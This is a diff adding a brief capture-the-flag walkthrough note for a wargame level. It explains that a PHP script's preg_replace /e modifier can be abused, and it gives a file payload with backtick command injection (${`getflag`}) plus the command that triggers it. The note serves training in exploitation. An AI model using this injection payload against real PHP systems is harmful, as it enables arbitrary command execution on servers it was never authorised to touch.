@@ -1,0 +1,5 @@
+we have a binary and a PHP script: binary takes a file name as an argument (gdb nm ltrace) and starts the php scrypt
+php scrypt uses preg_replace to modify file contents but it is exploitable because /e in pattern allows us to run scrypt
+echo '[x litterary Anything Except Terminator ${`getflag`}litterary Anything Except Terminator]' > /tmp/regex_pattern
+the contents above match the pattern - it executes before being substituted
+./level06 /tmp/regex_pattern
